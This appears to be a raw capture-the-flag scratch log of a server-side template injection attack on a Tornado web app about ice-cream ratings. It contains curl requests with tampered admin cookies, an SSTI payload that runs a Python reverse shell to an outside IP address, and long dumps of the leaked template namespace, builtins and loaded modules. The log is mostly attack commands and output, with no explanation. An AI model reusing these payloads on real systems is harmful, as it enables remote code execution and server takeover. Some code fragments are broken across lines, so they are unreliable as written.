curl 'http://chall.csivit.com:30279/?icecream=%7B%7B7*7%7D%7D' \
  -H 'Cookie: admin="2|1:0|10:1595311474|5:admin|8:ZmFsc2U=|f9da16d0a8e775b7cf6a36e99941797928085e18adb443ce4b8be2e005ec36d4"'


  ./ssti.sh "{% import os %}{{os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"3.17.117.250\",12213));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);')}}"

  stdout,stderr = subprocess.Popen(['ls']
stdout=subprocess.PIPE
stderr=subprocess.STDOUT).communicate(); print(stdout)

curl 'http://chall.csivit.com:30279/?icecream=\{\{secret\}\}' -H 'Cookie: __cfduid=d3da3b6ef85387eeaedef3a04ead2ac541595310941; admin="2|1:0|10:1595326137|5:admin|8:dHJ1ZQ==|d3e1bbec6070128ea9e4c8056c9635ad879776de4d688568d43288f58c31e7a7"'

 {'escape': <function xhtml_escape at 0x7f4230f8af80>
'xhtml_escape': <function xhtml_escape at 0x7f4230f8af80>
'url_escape': <function url_escape at 0x7f4230f98560>
'json_encode': <function json_encode at 0x7f4230f94e60>
'squeeze': <function squeeze at 0x7f4230f98050>
'linkify': <function linkify at 0x7f4230eb9b00>
'datetime': <module 'datetime' from '/usr/local/lib/python3.7/datetime.py'>
'_tt_utf8': <function utf8 at 0x7f4230f1def0>
'_tt_string_types': (<class 'str'>
<class 'bytes'>)
'__name__': '<string>'
'__loader__': {'get_source': <function Template.generate.<locals>.<lambda> at 0x7f4230093d40>}
'chocolate': 'My fav!! 10/10 would eat again'
'vanilla': 'Vanilla is good too but could be better i give it a 7/10'
'butterscotch': 'Yuck who even likes that. 1/10'
'application': <tornado.web.Application object at 0x7f423118c750>
'secret': "Unfortunately
you aren't worthy"
'__builtins__': {'__name__': 'builtins'
'__doc__': "Built-in functions
exceptions
and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices."
'__package__': ''
'__loader__': <class '_frozen_importlib.BuiltinImporter'>
'__spec__': ModuleSpec(name='builtins'
loader=<class '_frozen_importlib.BuiltinImporter'>)
'__build_class__': <built-in function __build_class__>
'__import__': <built-in function __import__>
'abs': <built-in function abs>
'all': <built-in function all>
'any': <built-in function any>
'ascii': <built-in function ascii>
'bin': <built-in function bin>
'breakpoint': <built-in function breakpoint>
'callable': <built-in function callable>
'chr': <built-in function chr>
'compile': <built-in function compile>
'delattr': <built-in function delattr>
'dir': <built-in function dir>
'divmod': <built-in function divmod>
'eval': <built-in function eval>
'exec': <built-in function exec>
'format': <built-in function format>
'getattr': <built-in function getattr>
'globals': <built-in function globals>
'hasattr': <built-in function hasattr>
'hash': <built-in function hash>
'hex': <built-in function hex>
'id': <built-in function id>
'input': <built-in function input>
'isinstance': <built-in function isinstance>
'issubclass': <built-in function issubclass>
'iter': <built-in function iter>
'len': <built-in function len>
'locals': <built-in function locals>
'max': <built-in function max>
'min': <built-in function min>
'next': <built-in function next>
'oct': <built-in function oct>
'ord': <built-in function ord>
'pow': <built-in function pow>
'print': <built-in function print>
'repr': <built-in function repr>
'round': <built-in function round>
'setattr': <built-in function setattr>
'sorted': <built-in function sorted>
'sum': <built-in function sum>
'vars': <built-in function vars>
'None': None
'Ellipsis': Ellipsis
'NotImplemented': NotImplemented
'False': False
'True': True
'bool': <class 'bool'>
'memoryview': <class 'memoryview'>
'bytearray': <class 'bytearray'>
'bytes': <class 'bytes'>
'classmethod': <class 'classmethod'>
'complex': <class 'complex'>
'dict': <class 'dict'>
'enumerate': <class 'enumerate'>
'filter': <class 'filter'>
'float': <class 'float'>
'frozenset': <class 'frozenset'>
'property': <class 'property'>
'int': <class 'int'>
'list': <class 'list'>
'map': <class 'map'>
'object': <class 'object'>
'range': <class 'range'>
'reversed': <class 'reversed'>
'set': <class 'set'>
'slice': <class 'slice'>
'staticmethod': <class 'staticmethod'>
'str': <class 'str'>
'super': <class 'super'>
'tuple': <class 'tuple'>
'type': <class 'type'>
'zip': <class 'zip'>
'__debug__': True
'BaseException': <class 'BaseException'>
'Exception': <class 'Exception'>
'TypeError': <class 'TypeError'>
'StopAsyncIteration': <class 'StopAsyncIteration'>
'StopIteration': <class 'StopIteration'>
'GeneratorExit': <class 'GeneratorExit'>
'SystemExit': <class 'SystemExit'>
'KeyboardInterrupt': <class 'KeyboardInterrupt'>
'ImportError': <class 'ImportError'>
'ModuleNotFoundError': <class 'ModuleNotFoundError'>
'OSError': <class 'OSError'>
'EnvironmentError': <class 'OSError'>
'IOError': <class 'OSError'>
'EOFError': <class 'EOFError'>
'RuntimeError': <class 'RuntimeError'>
'RecursionError': <class 'RecursionError'>
'NotImplementedError': <class 'NotImplementedError'>
'NameError': <class 'NameError'>
'UnboundLocalError': <class 'UnboundLocalError'>
'AttributeError': <class 'AttributeError'>
'SyntaxError': <class 'SyntaxError'>
'IndentationError': <class 'IndentationError'>
'TabError': <class 'TabError'>
'LookupError': <class 'LookupError'>
'IndexError': <class 'IndexError'>
'KeyError': <class 'KeyError'>
'ValueError': <class 'ValueError'>
'UnicodeError': <class 'UnicodeError'>
'UnicodeEncodeError': <class 'UnicodeEncodeError'>
'UnicodeDecodeError': <class 'UnicodeDecodeError'>
'UnicodeTranslateError': <class 'UnicodeTranslateError'>
'AssertionError': <class 'AssertionError'>
'ArithmeticError': <class 'ArithmeticError'>
'FloatingPointError': <class 'FloatingPointError'>
'OverflowError': <class 'OverflowError'>
'ZeroDivisionError': <class 'ZeroDivisionError'>
'SystemError': <class 'SystemError'>
'ReferenceError': <class 'ReferenceError'>
'MemoryError': <class 'MemoryError'>
'BufferError': <class 'BufferError'>
'Warning': <class 'Warning'>
'UserWarning': <class 'UserWarning'>
'DeprecationWarning': <class 'DeprecationWarning'>
'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>
'SyntaxWarning': <class 'SyntaxWarning'>
'RuntimeWarning': <class 'RuntimeWarning'>
'FutureWarning': <class 'FutureWarning'>
'ImportWarning': <class 'ImportWarning'>
'UnicodeWarning': <class 'UnicodeWarning'>
'BytesWarning': <class 'BytesWarning'>
'ResourceWarning': <class 'ResourceWarning'>
'ConnectionError': <class 'ConnectionError'>
'BlockingIOError': <class 'BlockingIOError'>
'BrokenPipeError': <class 'BrokenPipeError'>
'ChildProcessError': <class 'ChildProcessError'>
'ConnectionAbortedError': <class 'ConnectionAbortedError'>
'ConnectionRefusedError': <class 'ConnectionRefusedError'>
'ConnectionResetError': <class 'ConnectionResetError'>
'FileExistsError': <class 'FileExistsError'>
'FileNotFoundError': <class 'FileNotFoundError'>
'IsADirectoryError': <class 'IsADirectoryError'>
'NotADirectoryError': <class 'NotADirectoryError'>
'InterruptedError': <class 'InterruptedError'>
'PermissionError': <class 'PermissionError'>
'ProcessLookupError': <class 'ProcessLookupError'>
'TimeoutError': <class 'TimeoutError'>
'open': <built-in function open>
'quit': Use quit() or Ctrl-D (i.e. EOF) to exit
'exit': Use exit() or Ctrl-D (i.e. EOF) to exit
'copyright': Copyright (c) 2001-2020 Python Software Foundation.

def _tt_execute():  # <string>:0
    _tt_buffer = []  # <string>:0
    _tt_append = _tt_buffer.append  # <string>:0
    _tt_append(b'\n<html>\n <head><title> \xf0\x9f\x90\xb1\xe2\x80\x8d\xf0\x9f\x91\xa4Hello Hacker</title></head>\n <body style="background: #00FFFF;text-align:center;">\n <h1 style="font-size:5rem;"> \xf0\x9f\x90\xb1\xe2\x80\x8d\xf0\x9f\x91\xa4 The Usual Suspects \xf0\x9f\x90\xb1\xe2\x80\x8d\xf0\x9f\x91\xa4 </h1>\n <br />\n <h2 style="font-size:4rem;"> You Have Arrived! </h2>\n <br />\n <p style="font-size:2rem;"> \n <p>Hey
wanna know how I rate some ice-cream flavours?</p>\n <form method="GET"  action=\'/\'>\n  <select id="icecream" name="icecream">\n      <option value="')  # <string>:13
    _tt_append(b'{{')  # <string>:13
    _tt_append(b'chocolate}}">chocolate</option>\n      <option value="')  # <string>:14
    _tt_append(b'{{')  # <string>:14
    _tt_append(b'vanilla}}">vanilla</option>\n      <option value="')  # <string>:15
    _tt_append(b'{{')  # <string>:15
    _tt_append(b'butterscotch}}">butterscotch</option>\n  </select>\n  <input type="submit"></input>\n </form>\n <p>')  # <string>:19
    _tt_tmp = __loader__.get_source("__main__")  # <string>:19
    if isinstance(_tt_tmp
_tt_string_types): _tt_tmp = _tt_utf8(_tt_tmp)  # <string>:19
    else: _tt_tmp = _tt_utf8(str(_tt_tmp))  # <string>:19
    _tt_tmp = _tt_utf8(xhtml_escape(_tt_tmp))  # <string>:19
    _tt_append(_tt_tmp)  # <string>:19
    _tt_append(b'</p>\n </p>\n <br/> <br/>\n <p style="text-align:center; font-size:2rem;">\n Oh I heard you\'re looking for my secret. <br>\n <b>')  # <string>:24
    _tt_tmp = secret  # <string>:24
    if isinstance(_tt_tmp
_tt_string_types): _tt_tmp = _tt_utf8(_tt_tmp)  # <string>:24
    else: _tt_tmp = _tt_utf8(str(_tt_tmp))  # <string>:24
    _tt_tmp = _tt_utf8(xhtml_escape(_tt_tmp))  # <string>:24
    _tt_append(_tt_tmp)  # <string>:24
    _tt_append(b'</b>\n </p>\n </body>\n</html>\n')  # <string>:28
    return _tt_utf8('').join(_tt_buffer)  # <string>:0

dict_keys(['sys'
'builtins'
'_frozen_importlib'
'_imp'
'_thread'
'_warnings'
'_weakref'
'zipimport'
'_frozen_importlib_external'
'_io'
'marshal'
'posix'
'encodings'
'codecs'
'_codecs'
'encodings.aliases'
'encodings.utf_8'
'_signal'
'__main__'
'encodings.latin_1'
'io'
'abc'
'_abc'
'_bootlocale'
'_locale'
'site'
'os'
'stat'
'_stat'
'_collections_abc'
'posixpath'
'genericpath'
'os.path'
'_sitebuiltins'
'tornado'
'tornado.template'
'datetime'
'time'
'math'
'_datetime'
'linecache'
'functools'
'_functools'
'collections'
'operator'
'_operator'
'keyword'
'heapq'
'_heapq'
'itertools'
'reprlib'
'_collections'
'tokenize'
're'
'enum'
'types'
'sre_compile'
'_sre'
'sre_parse'
'sre_constants'
'copyreg'
'token'
'threading'
'traceback'
'_weakrefset'
'tornado.escape'
'html'
'html.entities'
'json'
'json.decoder'
'json.scanner'
'_json'
'json.encoder'
'urllib'
'urllib.parse'
'tornado.util'
'array'
'atexit'
'inspect'
'dis'
'opcode'
'_opcode'
'collections.abc'
'importlib'
'importlib._bootstrap'
'importlib._bootstrap_external'
'warnings'
'importlib.machinery'
'typing'
'contextlib'
'typing.io'
'typing.re'
'zlib'
'tornado.log'
'logging'
'weakref'
'string'
'_string'
'logging.handlers'
'socket'
'_socket'
'selectors'
'select'
'errno'
'pickle'
'struct'
'_struct'
'_compat_pickle'
'_pickle'
'queue'
'_queue'
'copy'
'curses'
'_curses'
'tornado.ioloop'
'asyncio'
'asyncio.base_events'
'concurrent'
'concurrent.futures'
'concurrent.futures._base'
'subprocess'
'signal'
'_posixsubprocess'
'ssl'
'_ssl'
'base64'
'binascii'
'asyncio.constants'
'asyncio.coroutines'
'asyncio.base_futures'
'asyncio.format_helpers'
'asyncio.log'
'asyncio.events'
'contextvars'
'_contextvars'
'asyncio.base_tasks'
'_asyncio'
'asyncio.futures'
'asyncio.protocols'
'asyncio.sslproto'
'asyncio.transports'
'asyncio.tasks'
'asyncio.locks'
'asyncio.runners'
'asyncio.queues'
'asyncio.streams'
'asyncio.subprocess'
'asyncio.unix_events'
'asyncio.base_subprocess'
'asyncio.selector_events'
'numbers'
'random'
'hashlib'
'_hashlib'
'_blake2'
'_sha3'
'bisect'
'_bisect'
'_random'
'tornado.concurrent'
'tornado.web'
'email'
'email.utils'
'email._parseaddr'
'calendar'
'locale'
'email.charset'
'email.base64mime'
'email.quoprimime'
'email.errors'
'email.encoders'
'quopri'
'gzip'
'_compression'
'hmac'
'http'
'http.cookies'
'mimetypes'
'tornado.gen'
'tornado.httpserver'
'tornado.http1connection'
'tornado.httputil'
'http.client'
'email.parser'
'email.feedparser'
'email._policybase'
'email.header'
'email.message'
'uu'
'email._encoded_words'
'email.iterators'
'unicodedata'
'tornado.iostream'
'tornado.netutil'
'tornado.platform'
'tornado.platform.auto'
'tornado.platform.posix'
'fcntl'
'encodings.idna'
'stringprep'
'concurrent.futures.thread'
'tornado.tcpserver'
'tornado.process'
'multiprocessing'
'multiprocessing.context'
'multiprocessing.process'
'multiprocessing.reduction'
'__mp_main__'
'tornado.locale'
'csv'
'_csv'
'gettext'
'tornado._locale_data'
'tornado.routing'
'pwd'
'grp'
'tornado.autoreload'
'pkgutil'
'importlib.util'
'importlib.abc'
'tornado.platform.asyncio'])